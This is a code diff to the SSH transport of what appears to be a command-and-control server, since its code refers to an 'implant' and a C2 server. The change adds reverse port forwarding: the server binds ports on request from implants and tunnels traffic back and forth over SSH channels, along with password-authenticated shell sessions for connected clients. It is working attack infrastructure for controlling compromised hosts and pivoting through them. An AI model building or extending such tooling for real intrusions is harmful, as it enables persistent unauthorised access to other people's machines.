@@ -3,18 +3,17 @@ import socket
 import logging
 import threading
 import os
+import select
 from typing import Tuple, Callable
 
 from ..session.client_session import ClientSession
 from .base_server import BaseServer
-from paramiko import SFTPServer, SFTPServerInterface
 
 logger = logging.getLogger('c2.ssh')
 
-
 class SSHServerInterface(paramiko.ServerInterface):
-    """SSH Server Interface implementation"""
-    
+    """SSH Server Interface implementation with reverse port forwarding support"""
+
     def __init__(self, config: dict):
         super().__init__()
         self.config = config
@@ -22,22 +21,144 @@ class SSHServerInterface(paramiko.ServerInterface):
         self.term_settings = None
         self.event = threading.Event()
         self.is_sftp_connection = False
+        self.forwarded_ports = {}  # (addr, port) -> (socket, thread_event)
+        self.transport = None
+
+    def set_transport(self, transport: paramiko.Transport):
+        """Store transport to open forwarded channels"""
+        self.transport = transport
 
     def check_channel_request(self, kind: str, chanid: int) -> int:
         if kind == 'session':
             return paramiko.OPEN_SUCCEEDED
         if kind == 'forwarded-tcpip':
-            self.is_sftp_connection = True  # Mark as SFTP connection
             return paramiko.OPEN_SUCCEEDED
         return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
 
-    def check_port_forward_request(self, addr, port):
-        """Handle port forwarding requests from implant"""
-        logger.info(f"Port forward request from {addr}:{port}")
-        return port  # Allow and return the same port
+    def check_port_forward_request(self, addr: str, port: int):
+        """Handle remote (reverse) port forwarding requests"""
+        logger.info(f"Port forward request from implant: {addr}:{port}")
         
+        # Check if this port is already forwarded
+        if (addr, port) in self.forwarded_ports:
+            logger.warning(f"Port {addr}:{port} is already forwarded, canceling previous forward")
+            self.cancel_port_forward_request(addr, port)
+            # Allow some time for the socket to close properly
+            import time
+            time.sleep(0.5)
+        
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.bind((addr, port))
+            sock.listen(5)
+            
+            # Create an event to signal thread termination
+            stop_event = threading.Event()
+            
+            # Store both socket and event
+            self.forwarded_ports[(addr, port)] = (sock, stop_event)
+            
+            # Start handler thread
+            forward_thread = threading.Thread(
+                target=self._forward_handler, 
+                args=(sock, addr, port, stop_event), 
+                daemon=True
+            )
+            forward_thread.start()
+            
+            return port
+        except Exception as e:
+            logger.error(f"Failed to bind forwarded port {addr}:{port}: {e}")
+            return False
+
+    def cancel_port_forward_request(self, addr: str, port: int):
+        """Cancel a forwarded port and clean up resources"""
+        logger.info(f"Canceling port forward for {addr}:{port}")
+        
+        if (addr, port) not in self.forwarded_ports:
+            logger.warning(f"No forwarding found for {addr}:{port}")
+            return
+            
+        sock, stop_event = self.forwarded_ports.pop((addr, port))
+        
+        # Signal the thread to stop
+        stop_event.set()
+        
+        # Close the socket to unblock accept()
+        try:
+            sock.close()
+            logger.info(f"Closed forwarded port {addr}:{port}")
+        except Exception as e:
+            logger.error(f"Error closing forwarded port: {e}")
+
+    def _forward_handler(self, sock: socket.socket, addr: str, port: int, stop_event: threading.Event):
+        """Accept connections on forwarded port and open channel back to client"""
+        logger.info(f"Forward handler started for {addr}:{port}")
+        
+        # Set socket timeout to allow checking stop_event periodically
+        sock.settimeout(1.0)
+        
+        while not stop_event.is_set():
+            try:
+                client_sock, client_addr = sock.accept()
+                logger.debug(f"Accepted connection from {client_addr} on forwarded port {port}")
+                
+                if self.transport is None or not self.transport.is_active():
+                    logger.warning("Transport not available for forwarded connection")
+                    client_sock.close()
+                    continue
+                    
+                channel = self.transport.open_forwarded_tcpip_channel((addr, port), client_addr)
+                if channel is None:
+                    logger.warning("Failed to open forwarded channel")
+                    client_sock.close()
+                    continue
+                    
+                threading.Thread(
+                    target=self._tunnel_data, 
+                    args=(client_sock, channel, stop_event), 
+                    daemon=True
+                ).start()
+                
+            except socket.timeout:
+                # This is expected due to the timeout we set
+                continue
+            except OSError as e:
+                if stop_event.is_set():
+                    # This is an expected error when closing the socket
+                    logger.debug(f"Socket closed for {addr}:{port}")
+                else:
+                    logger.error(f"Unexpected socket error in forward handler: {e}")
+                break
+            except Exception as e:
+                logger.error(f"Error in forward handler {addr}:{port}: {e}")
+                break
+                
+        logger.info(f"Forward handler stopped for {addr}:{port}")
+
+    def _tunnel_data(self, sock: socket.socket, channel: paramiko.Channel, stop_event: threading.Event):
+        """Bi-directional tunnel between socket and SSH channel"""
+        try:
+            while not stop_event.is_set():
+                r, w, x = select.select([sock, channel], [], [], 0.5)
+                if sock in r:
+                    data = sock.recv(1024)
+                    if not data:
+                        break
+                    channel.send(data)
+                if channel in r:
+                    data = channel.recv(1024)
+                    if not data:
+                        break
+                    sock.send(data)
+        except Exception as e:
+            logger.error(f"Error in tunnel: {e}")
+        finally:
+            sock.close()
+            channel.close()
+
     def check_channel_pty_request(self, channel, term, width, height, width_pixels, height_pixels, modes):
-        # Store term settings with correct param names for get_pty()
         self.pty_enabled = True
         self.term_settings = {
             'term': term,
@@ -47,11 +168,10 @@ class SSHServerInterface(paramiko.ServerInterface):
             'height_pixels': height_pixels,
             'modes': modes
         }
-        logger.info(f"PTY requested: {term} ({width}x{height} chars, {width_pixels}x{height_pixels} pixels)")
+        logger.info(f"PTY requested: {term} ({width}x{height})")
         return True
 
     def check_channel_shell_request(self, channel):
-        # Allow shell regardless of PTY negotiation
         logger.info("Shell request accepted")
         return True
 
@@ -61,26 +181,24 @@ class SSHServerInterface(paramiko.ServerInterface):
             logger.info("SFTP subsystem request accepted")
             return True
         return False
-    
-    def check_auth_password(self, username, password):
-        if (username == self.config['username'] and 
-            password == self.config['password']):
+
+    def check_auth_password(self, username: str, password: str) -> int:
+        if username == self.config['username'] and password == self.config['password']:
             return paramiko.AUTH_SUCCESSFUL
         logger.warning(f"Authentication failed for user: {username}")
         return paramiko.AUTH_FAILED
-        
-    def get_allowed_auths(self, username):
+
+    def get_allowed_auths(self, username: str) -> str:
         return 'password'
 
 class SSHServer(BaseServer):
     """SSH transport implementation for C2 server"""
-    
+
     def __init__(self, config: dict, client_connected_callback: Callable = None):
         super().__init__(config, client_connected_callback)
         self.server_socket = None
         self.host_key = None
         self._load_host_key()
-
 
     def _load_host_key(self):
         key_path = self.config['host_key']
@@ -95,7 +213,7 @@ class SSHServer(BaseServer):
         except Exception as e:
             logger.error(f"Failed to load host key: {e}")
             raise
-    
+
     def start(self):
         if self.running:
             logger.warning("SSH server already running")
@@ -113,14 +231,14 @@ class SSHServer(BaseServer):
             if self.server_socket:
                 self.server_socket.close()
             raise
-    
+
     def stop(self):
         self.running = False
         if self.server_socket:
             self.server_socket.close()
             self.server_socket = None
         logger.info("SSH server stopped")
-    
+
     def _accept_connections(self):
         while self.running:
             try:
@@ -130,36 +248,33 @@ class SSHServer(BaseServer):
                 break
             except Exception as e:
                 logger.error(f"Error in accept loop: {e}")
-    
-    def _handle_connection(self, client_socket, addr: Tuple[str, int]):
+
+    def _handle_connection(self, client_socket: socket.socket, addr: Tuple[str, int]):
         logger.info(f"New SSH connection from {addr[0]}:{addr[1]}")
         try:
             transport = paramiko.Transport(client_socket)
             transport.add_server_key(self.host_key)
-            
+
             server_interface = SSHServerInterface(self.config)
             transport.start_server(server=server_interface)
-            
+            server_interface.set_transport(transport)
+
             channel = transport.accept(20)
             if channel is None:
                 logger.error(f"No channel established from {addr}")
                 return
 
-            # Don't create a new client session for SFTP connections
             if server_interface.is_sftp_connection or addr[0] == '127.0.0.1':
-                    logger.debug("SFTP connection - skipping client session registration")
-                    return
+                logger.debug("SFTP connection - skipping client session registration")
+                return
 
-            # allocate server-side PTY if requested by client
             if server_interface.pty_enabled and server_interface.term_settings:
                 channel.get_pty(**server_interface.term_settings)
                 channel.invoke_shell()
 
-            # Receive initial client info banner
             client_info = channel.recv(1024).decode(errors='replace')
             logger.info(f"Client info received: {client_info.strip()}")
 
-            # Create session and register
             client = ClientSession(
                 channel=channel,
                 client_info=client_info,
@@ -170,8 +285,6 @@ class SSHServer(BaseServer):
                 term_settings=server_interface.term_settings
             )
             self.add_client(client)
-            # send a space so client knows connection is live
             channel.send(' ')
         except Exception as e:
             logger.error(f"Error handling connection: {e}")
-        # do not close socket here; transport closes on disconnect
